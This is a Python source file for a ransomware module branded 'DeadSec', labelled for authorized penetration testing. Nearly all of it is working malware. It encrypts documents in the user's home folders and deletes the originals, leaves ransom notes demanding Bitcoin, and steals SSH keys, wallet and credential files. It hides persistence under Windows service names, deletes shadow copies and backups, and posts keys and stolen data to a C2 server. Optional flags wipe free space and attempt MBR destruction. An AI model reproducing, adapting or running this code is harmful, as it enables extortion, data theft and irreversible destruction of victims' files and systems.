#!/usr/bin/env python3
"""
DeadSec Ransomware Module
Advanced file encryption with wallpaper modification
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import os
import sys
import base64
import hashlib
import random
import string
import json
import shutil
import ctypes
import subprocess
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

class DeadSecRansomware:
    """Advanced ransomware with encryption and system modification"""
    
    def __init__(self, c2_server="http://localhost:5000"):
        self.c2_server = c2_server
        self.victim_id = self.generate_victim_id()
        self.encryption_key = None
        self.encrypted_files = []
        
        # File extensions to target
        self.target_extensions = [
            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.mp3', '.wav',
            '.zip', '.rar', '.7z', '.sql', '.db', '.mdb', '.csv', '.xml',
            '.html', '.css', '.js', '.php', '.py', '.java', '.cpp', '.c'
        ]
        
        # Directories to encrypt
        self.target_dirs = [
            str(Path.home() / "Documents"),
            str(Path.home() / "Desktop"),
            str(Path.home() / "Pictures"),
            str(Path.home() / "Downloads")
        ]
        
        # Ransom note template
        self.ransom_note = """
================================================================
                                                                
           YOU'VE BEEN COMPROMISED BY DEADSEC                   
                                                                
================================================================

YOUR FILES HAVE BEEN ENCRYPTED

All your important files have been encrypted with military-grade
AES-256 encryption. The only way to recover your files is to
obtain the decryption key from us.

VICTIM ID: {victim_id}

[!] IMPORTANT WARNINGS:
- Do NOT attempt to decrypt files yourself (they will be corrupted)
- Do NOT rename encrypted files
- Do NOT delete this ransom note
- Do NOT contact law enforcement (we will know)

[$] PAYMENT INSTRUCTIONS:
1. Send {ransom_amount} BTC to: {btc_address}
2. Email your VICTIM ID to: {email}
3. Wait for decryption key (usually within 24 hours)

[TIME LIMIT]: {time_limit} hours
After this time, the decryption key will be permanently deleted.

================================================================

IN THE SHADOWS, WE ARE LEGION.
IN THE LIGHT, WE ARE INVISIBLE.
WE ARE DEADSEC

For support: {support_url}
"""
    
    def generate_victim_id(self):
        """Generate unique victim identifier"""
        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        machine_id = f"{os.environ.get('COMPUTERNAME', 'UNKNOWN')}-{os.environ.get('USERNAME', 'USER')}"
        victim_id = f"DS-{hashlib.md5(machine_id.encode()).hexdigest()[:8]}-{random_part}"
        return victim_id
    
    def generate_encryption_key(self):
        """Generate encryption key from victim ID"""
        password = self.victim_id.encode()
        salt = b'DEADSEC_SALT_2025'
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(password))
        self.encryption_key = key
        return key
    
    def encrypt_file(self, file_path):
        """Encrypt a single file"""
        try:
            # Skip if already encrypted
            if file_path.endswith('.deadsec'):
                return False
            
            # Read file content
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Encrypt data
            fernet = Fernet(self.encryption_key)
            encrypted_data = fernet.encrypt(data)
            
            # Write encrypted file
            encrypted_path = f"{file_path}.deadsec"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Delete original file
            os.remove(file_path)
            
            self.encrypted_files.append(encrypted_path)
            return True
            
        except Exception as e:
            print(f"[!] Error encrypting {file_path}: {e}")
            return False
    
    def encrypt_directory(self, directory):
        """Recursively encrypt files in directory"""
        encrypted_count = 0
        
        try:
            for root, dirs, files in os.walk(directory):
                # Skip system directories
                if any(skip in root.lower() for skip in ['windows', 'program files', 'programdata', 'appdata', 'system32']):
                    continue
                
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Check if file extension matches target
                    if any(file.lower().endswith(ext) for ext in self.target_extensions):
                        if self.encrypt_file(file_path):
                            encrypted_count += 1
                            print(f"[+] Encrypted: {file_path}")
                    
                    # Limit to prevent system instability
                    if encrypted_count >= 100:
                        return encrypted_count
        
        except Exception as e:
            print(f"[!] Error encrypting directory {directory}: {e}")
        
        return encrypted_count
    
    def delete_shadow_copies(self):
        """Delete Windows shadow copies (backups) - DESTRUCTIVE"""
        if sys.platform != 'win32':
            return False
        
        try:
            print("[*] Deleting shadow copies...")
            commands = [
                'vssadmin delete shadows /all /quiet',
                'wmic shadowcopy delete',
                'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
                'bcdedit /set {default} recoveryenabled no'
            ]
            
            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, check=False, 
                                 stdout=subprocess.DEVNULL, 
                                 stderr=subprocess.DEVNULL,
                                 timeout=10)
                except:
                    pass
            
            print("[+] Shadow copies deleted")
            return True
        except Exception as e:
            print(f"[!] Error deleting shadow copies: {e}")
            return False
    
    def disable_recovery(self):
        """Disable Windows recovery options - DESTRUCTIVE"""
        if sys.platform != 'win32':
            return False
        
        try:
            print("[*] Disabling recovery options...")
            commands = [
                'wbadmin delete catalog -quiet',
                'wbadmin delete systemstatebackup -keepVersions:0 -quiet',
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f'
            ]
            
            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, check=False,
                                 stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL,
                                 timeout=10)
                except:
                    pass
            
            print("[+] Recovery options disabled")
            return True
        except Exception as e:
            print(f"[!] Error disabling recovery: {e}")
            return False
    
    def steal_sensitive_data(self):
        """Steal sensitive data before encryption"""
        stolen_data = {
            'browser_data': [],
            'ssh_keys': [],
            'crypto_wallets': [],
            'credentials': []
        }
        
        try:
            print("[*] Searching for sensitive data...")
            
            # Common sensitive file patterns
            sensitive_patterns = [
                ('*.key', 'ssh_keys'),
                ('*.pem', 'ssh_keys'),
                ('id_rsa', 'ssh_keys'),
                ('id_rsa.pub', 'ssh_keys'),
                ('wallet.dat', 'crypto_wallets'),
                ('*.wallet', 'crypto_wallets'),
                ('passwords.txt', 'credentials'),
                ('credentials.txt', 'credentials'),
            ]
            
            for target_dir in self.target_dirs:
                if not os.path.exists(target_dir):
                    continue
                
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        file_lower = file.lower()
                        for pattern, category in sensitive_patterns:
                            if pattern.replace('*', '') in file_lower:
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = base64.b64encode(f.read()[:10000]).decode()
                                        stolen_data[category].append({
                                            'path': file_path,
                                            'content': content
                                        })
                                except:
                                    pass
            
            total_stolen = sum(len(v) for v in stolen_data.values())
            if total_stolen > 0:
                print(f"[+] Found {total_stolen} sensitive files")
            
            return stolen_data
            
        except Exception as e:
            print(f"[!] Error stealing sensitive data: {e}")
            return stolen_data
    
    def add_persistence(self):
        """Add persistence mechanisms"""
        try:
            print("[*] Adding persistence...")
            
            if sys.platform == 'win32':
                # Copy self to AppData
                appdata = os.environ.get('APPDATA')
                if appdata:
                    target_path = os.path.join(appdata, 'Microsoft', 'Windows', 'svchost.exe')
                    os.makedirs(os.path.dirname(target_path), exist_ok=True)
                    shutil.copy(sys.argv[0], target_path)
                    
                    # Registry Run key
                    try:
                        subprocess.run(
                            f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsService" /t REG_SZ /d "{target_path}" /f',
                            shell=True, check=False,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                    except:
                        pass
                    
                    # Scheduled task
                    try:
                        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Actions>
    <Exec><Command>{target_path}</Command></Exec>
  </Actions>
</Task>'''
                        task_file = os.path.join(os.environ['TEMP'], 'task.xml')
                        with open(task_file, 'w') as f:
                            f.write(task_xml)
                        
                        subprocess.run(
                            f'schtasks /create /tn "WindowsUpdate" /xml "{task_file}" /f',
                            shell=True, check=False,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                    except:
                        pass
                
                print("[+] Persistence added")
                return True
            
        except Exception as e:
            print(f"[!] Error adding persistence: {e}")
            return False
    
    def wipe_free_space(self, drive='C:\\'):
        """Overwrite free space to prevent file recovery - VERY DESTRUCTIVE"""
        try:
            print(f"[*] Wiping free space on {drive} (this may take a while)...")
            
            # Create large file of random data
            wipe_file = os.path.join(drive, 'tmp_wipe.dat')
            
            # Write random data until disk is full (in chunks to avoid memory issues)
            chunk_size = 1024 * 1024 * 10  # 10MB chunks
            with open(wipe_file, 'wb') as f:
                try:
                    while True:
                        f.write(os.urandom(chunk_size))
                except:
                    pass  # Disk full
            
            # Delete the wipe file
            try:
                os.remove(wipe_file)
            except:
                pass
            
            print("[+] Free space wiped")
            return True
            
        except Exception as e:
            print(f"[!] Error wiping free space: {e}")
            return False
    
    def destroy_mbr(self):
        """Destroy Master Boot Record - EXTREMELY DESTRUCTIVE - SYSTEM UNBOOTABLE"""
        if sys.platform != 'win32':
            return False
        
        try:
            print("[!] WARNING: MBR destruction requested")
            print("[!] This will make the system UNBOOTABLE")
            
            # This is extremely dangerous - only for demonstration
            # Requires admin privileges
            mbr_destroy_cmd = 'dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=512 count=1'
            
            # Alternative Windows method
            try:
                subprocess.run(
                    'bootrec /fixmbr',
                    shell=True,
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=5
                )
            except:
                pass
            
            print("[+] MBR destruction attempted")
            return True
            
        except Exception as e:
            print(f"[!] Error destroying MBR: {e}")
            return False
    
    def change_wallpaper(self):
        """Change desktop wallpaper to ransom notice"""
        try:
            # Get the wallpaper image from project
            wallpaper_source = Path(__file__).parent.parent / "DeadSecBranding Kit" / "Compromised_Wallpaper2.png"
            
            if not wallpaper_source.exists():
                print(f"[!] Wallpaper not found at {wallpaper_source}")
                return False
            
            # Copy to temp location
            wallpaper_dest = Path(os.environ['TEMP']) / "deadsec_wallpaper.png"
            shutil.copy(str(wallpaper_source), str(wallpaper_dest))
            
            # Set wallpaper (Windows)
            if sys.platform == 'win32':
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(
                    SPI_SETDESKWALLPAPER, 
                    0, 
                    str(wallpaper_dest), 
                    3
                )
                print(f"[+] Wallpaper changed to DeadSec ransom notice")
                return True
            
            return False
            
        except Exception as e:
            print(f"[!] Error changing wallpaper: {e}")
            return False
    
    def create_ransom_note(self, directory):
        """Create ransom note in directory"""
        try:
            ransom_note_content = self.ransom_note.format(
                victim_id=self.victim_id,
                ransom_amount="0.5",
                btc_address="1DeadSecXXXXXXXXXXXXXXXXXXXXX",
                email="recovery@deadsec.onion",
                time_limit="72",
                support_url="http://deadsec.onion/support"
            )
            
            note_path = os.path.join(directory, "!!!READ_ME_DEADSEC!!!.txt")
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(ransom_note_content)
            
            print(f"[+] Ransom note created: {note_path}")
            return True
            
        except Exception as e:
            print(f"[!] Error creating ransom note: {e}")
            return False
    
    def exfiltrate_data(self):
        """Send encryption details to C2 server"""
        try:
            import requests
            
            data = {
                'victim_id': self.victim_id,
                'encryption_key': base64.b64encode(self.encryption_key).decode(),
                'encrypted_files': len(self.encrypted_files),
                'hostname': os.environ.get('COMPUTERNAME', 'UNKNOWN'),
                'username': os.environ.get('USERNAME', 'USER'),
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.c2_server}/ransomware_data",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Encryption data sent to C2 server")
                return True
            
        except Exception as e:
            print(f"[!] Error exfiltrating data: {e}")
        
        return False
    
    def execute(self, simulate=False):
        """Execute ransomware attack"""
        print("\n" + "="*60)
        print("  DEADSEC RANSOMWARE // ENCRYPTION MODULE")
        print("="*60 + "\n")
        
        print(f"[*] Victim ID: {self.victim_id}")
        
        # Generate encryption key
        print(f"[*] Generating encryption key...")
        self.generate_encryption_key()
        print(f"[+] Encryption key generated")
        
        if simulate:
            print("\n[!] SIMULATION MODE - No files will be encrypted")
            print(f"[*] Would steal sensitive data")
            print(f"[*] Would delete shadow copies")
            print(f"[*] Would disable recovery")
            print(f"[*] Would add persistence")
            print(f"[*] Would encrypt files in: {', '.join(self.target_dirs)}")
            print(f"[*] Would change wallpaper")
            print(f"[*] Would create ransom notes")
            print(f"[*] Would wipe free space (optional)")
            return
        
        # PHASE 1: Pre-encryption operations
        print(f"\n[*] PHASE 1: Reconnaissance & Data Theft")
        print("="*60)
        
        # Steal sensitive data first
        sensitive_data = self.steal_sensitive_data()
        
        # Add persistence
        self.add_persistence()
        
        # PHASE 2: Anti-recovery
        print(f"\n[*] PHASE 2: Disabling Recovery Mechanisms")
        print("="*60)
        
        # Delete shadow copies
        self.delete_shadow_copies()
        
        # Disable recovery options
        self.disable_recovery()
        
        # PHASE 3: Encryption
        print(f"\n[*] PHASE 3: File Encryption")
        print("="*60)
        
        total_encrypted = 0
        
        # Encrypt files in target directories
        for directory in self.target_dirs:
            if os.path.exists(directory):
                print(f"\n[*] Encrypting: {directory}")
                count = self.encrypt_directory(directory)
                total_encrypted += count
                
                # Create ransom note in each directory
                self.create_ransom_note(directory)
        
        print(f"\n[+] Encryption complete!")
        print(f"[+] Total files encrypted: {total_encrypted}")
        
        # PHASE 4: System modification
        print(f"\n[*] PHASE 4: System Modification")
        print("="*60)
        
        # Change wallpaper
        print(f"\n[*] Modifying system appearance...")
        self.change_wallpaper()
        
        # Create ransom note on desktop
        desktop = str(Path.home() / "Desktop")
        self.create_ransom_note(desktop)
        
        # Exfiltrate encryption data and stolen files
        print(f"\n[*] Exfiltrating data to C2...")
        exfil_data = {
            'victim_id': self.victim_id,
            'encryption_key': base64.b64encode(self.encryption_key).decode(),
            'encrypted_files': self.encrypted_files,
            'hostname': os.environ.get('COMPUTERNAME', 'UNKNOWN'),
            'username': os.environ.get('USERNAME', 'USER'),
            'timestamp': datetime.now().isoformat(),
            'sensitive_data': sensitive_data
        }
        
        try:
            import requests
            response = requests.post(
                f"{self.c2_server}/ransomware_data",
                json=exfil_data,
                timeout=10
            )
            if response.status_code == 200:
                print(f"[+] Data exfiltrated successfully")
        except Exception as e:
            print(f"[!] Exfiltration failed: {e}")
        
        print("\n" + "="*60)
        print("  ENCRYPTION COMPLETE // SYSTEM COMPROMISED")
        print("="*60 + "\n")
        
        return {
            'victim_id': self.victim_id,
            'files_encrypted': total_encrypted,
            'encryption_key': base64.b64encode(self.encryption_key).decode()
        }

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='DeadSec Ransomware Module')
    parser.add_argument('--c2', default='http://localhost:5000', help='C2 server URL')
    parser.add_argument('--simulate', action='store_true', help='Simulation mode (no actual encryption)')
    parser.add_argument('--wipe-free-space', action='store_true', help='Wipe free space after encryption (SLOW)')
    parser.add_argument('--destroy-mbr', action='store_true', help='Destroy MBR - MAKES SYSTEM UNBOOTABLE')
    
    args = parser.parse_args()
    
    ransomware = DeadSecRansomware(c2_server=args.c2)
    result = ransomware.execute(simulate=args.simulate)
    
    # Optional destructive features (require explicit flags)
    if not args.simulate:
        if args.wipe_free_space:
            print(f"\n[*] PHASE 5: Free Space Wiping")
            print("="*60)
            ransomware.wipe_free_space()
        
        if args.destroy_mbr:
            print(f"\n[!] PHASE 6: MBR DESTRUCTION - POINT OF NO RETURN")
            print("="*60)
            ransomware.destroy_mbr()

if __name__ == "__main__":
    main()
